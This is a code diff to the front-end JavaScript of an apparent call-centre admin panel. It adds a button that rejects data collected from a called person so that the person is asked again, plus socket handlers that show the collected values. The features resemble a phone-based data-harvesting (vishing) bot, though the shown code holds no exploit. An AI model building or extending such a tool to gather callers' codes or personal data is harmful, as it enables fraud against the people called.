@@ -97,6 +97,7 @@ document.getElementById('callForm').addEventListener('submit', async (e) => {
     }
 });
 
+// Action buttons
 document.querySelectorAll('.action-btn').forEach(btn => {
     btn.addEventListener('click', async () => {
         if (!currentSessionId) {
@@ -123,6 +124,32 @@ document.querySelectorAll('.action-btn').forEach(btn => {
     });
 });
 
+// Reject button
+document.getElementById('rejectDataBtn').addEventListener('click', async () => {
+    if (!currentSessionId) {
+        addLog('No active call selected', 'warning');
+        return;
+    }
+    
+    try {
+        const response = await fetch(`/api/admin/reject-data/${currentSessionId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        
+        const data = await response.json();
+        if (data.success) {
+            addLog(`Rejected: ${data.message}`, 'warning');
+            loadContacts();
+        } else {
+            addLog(`Failed to reject: ${data.message}`, 'error');
+        }
+    } catch (error) {
+        addLog(`Error rejecting data: ${error.message}`, 'error');
+    }
+});
+
+// Custom voice
 document.getElementById('sendCustomVoice').addEventListener('click', async () => {
     if (!currentSessionId) {
         addLog('No active call selected', 'warning');
@@ -157,7 +184,7 @@ document.getElementById('clearLogs').addEventListener('click', () => {
     container.innerHTML = '<div class="log-entry info">Logs cleared</div>';
 });
 
-// SOCKET EVENTS - THIS IS THE FIX
+// SOCKET EVENTS
 socket.on('call_initiated', (data) => {
     addLog(`Call initiated to ${data.phone_number}`, 'info');
     currentSessionId = data.session_id;
@@ -165,18 +192,15 @@ socket.on('call_initiated', (data) => {
     playNotificationSound();
 });
 
-// THIS IS THE MAIN EVENT - user_response from backend
 socket.on('user_response', (data) => {
     addLog(`User pressed ${data.value}`, 'success');
     playNotificationSound();
     
     if (data.value === '1') {
-        // ENABLE BUTTONS
         document.getElementById('actionButtons').style.display = 'grid';
         document.getElementById('customVoiceSection').style.display = 'block';
         addLog('CONSENT RECEIVED! Admin buttons are now active.', 'success');
         
-        // Update active call display
         const activeCallDiv = document.getElementById('activeCallInfo');
         if (activeCallDiv) {
             activeCallDiv.innerHTML = `
@@ -200,12 +224,16 @@ socket.on('data_collected', (data) => {
     playNotificationSound();
     loadContacts();
     
-    // Popup notification
     const notification = document.createElement('div');
     notification.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#10b981;color:white;padding:12px 20px;border-radius:8px;z-index:9999;font-weight:bold;box-shadow:0 4px 6px rgba(0,0,0,0.1);';
     notification.innerHTML = `<i class="fas fa-database"></i> ${data.type.toUpperCase()}: ${data.value}`;
     document.body.appendChild(notification);
     setTimeout(() => notification.remove(), 3000);
+});
+
+socket.on('data_rejected', (data) => {
+    addLog(`Data REJECTED: ${data.type} = ${data.value} - User will be asked again`, 'warning');
+    playNotificationSound();
 });
 
 socket.on('admin_action', (data) => {
